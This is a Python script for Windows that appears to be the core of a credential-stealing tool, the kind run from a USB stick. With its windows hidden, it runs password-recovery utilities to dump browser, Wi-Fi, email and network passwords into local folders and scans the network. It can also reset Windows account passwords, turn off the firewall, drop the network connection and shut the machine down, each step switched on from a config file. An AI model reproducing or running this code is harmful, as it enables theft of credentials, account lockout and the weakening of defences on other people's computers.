import os, sys, ctypes, getpass, socket, subprocess
exec(open("config.py").read())

si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW

# setting up directory
usr = getpass.getuser()
if not os.path.exists("hosts/" + usr):
    os.makedirs("hosts/" + usr)
    root = usr
elif duplicate_exec:
    usr_x = 1
    usr_ct = 2
    while usr_x:
        usr_ct = str(usr_ct)
        if not os.path.exists("hosts/"+ usr + " (" + usr_ct + ")"):
            os.makedirs("hosts/" + usr + " (" + usr_ct + ")")
            root = usr + " (" + usr_ct + ")"
            usr_x = 0
        else:
            usr_ct = int(usr_ct)
            usr_ct += 1
else:
    sys.exit()

rootdir = "..\hosts\\" + root + "\\"


# checking internet connectivity
try:
    socket.create_connection(("www.google.com", 80))
    inet = 1
except OSError:
    pass
    inet = 0

os.chdir("payloads")
# password recovery
if browser_pwds:
    p = rootdir + "Browser passwords.html"
    subprocess.call(["WebBrowserPassView.exe", "/shtml", p], startupinfo=si)
if wireless_keys:
    p = rootdir + "Wireless passwords.html"
    subprocess.call(["WirelesskeyView.exe", "/shtml", p], startupinfo=si)
if email_pst_pwds:
    p = rootdir + "Email pst passwords.html"
    subprocess.call(["PstPassword.exe", "/shtml", p], startupinfo=si)
if mail_pwds:
    p = rootdir + "Mail passwords.html"
    subprocess.call(["mailpv.exe", "/shtml", p], startupinfo=si)
if network_pwds:
    p = rootdir + "Network passwords.html"
    subprocess.call(["netpass.exe", "/shtml", p], startupinfo=si)
if msn_pwds:
    p = rootdir + "MSN passwords.html"
    subprocess.call(["mspass.exe", "/shtml", p], startupinfo=si)
if dialup_pwds:
    p = rootdir + "Dialup passwords.html"
    subprocess.call(["Dialupass.exe" ,"/shtml", p], startupinfo=si)

# recon
if network_scan and inet:
    p = rootdir + "Network scan.html"
    subprocess.call(["WNetWatcher.exe", "/shtml", p], startupinfo=si)

# changing nt password
if change_nt_pwd["current_acc_controller"]:
    xpwd = change_nt_pwd["current_acc_pwd"]
    subprocess.call("cmd /c net user "+'"'+"%username%"+'" '+'"'+xpwd+'"', startupinfo=si)
if change_nt_pwd["diff_acc_controller"]:
    xusr = change_nt_pwd["diff_acc_usr"]
    xpwd = change_nt_pwd["diff_acc_pwd"]
    subprocess.call("cmd /c net user "+'"'+xusr+'" '+'"'+xpwd+'"', startupinfo=si)

# Network based executions
if deactivate_firewall:
    subprocess.call("netsh advfirewall set allprofiles state off", startupinfo=si)
if activate_firewall:
    subprocess.call("netsh advfirewall set allprofiles state on", startupinfo=si)
if release_net_adapters:
    subprocess.call("ipconfig /release", startupinfo=si)
if renew_net_adapters:
    subprocess.call("ipconfig /renew", startupinfo=si)
if flush_dns:
    subprocess.call("ipconfig /flushdns", startupinfo=si)
if register_dns:
    subprocess.call("ipconfig /registerdns", startupinfo=si)

if batch_info:
    subprocess.call(["bi.bat", root, rootdir], startupinfo=si)

# msg box
if msgbox["controller"]:
    ctypes.windll.user32.MessageBoxW(0, msgbox["msg"], msgbox["title"], msgbox["buttons"])

# shutdown code
if power["controller"]:
    if power["mode"] != "":
        shutdown = "shutdown -" + power['mode']
        if power["comment"] != "":
            shutdown = shutdown + " -c " + "\"" + power['comment'] + "\""
        if power["timeout"] != "":
                shutdown = shutdown + " -t " + power['timeout']
        subprocess.call(shutdown, startupinfo=si)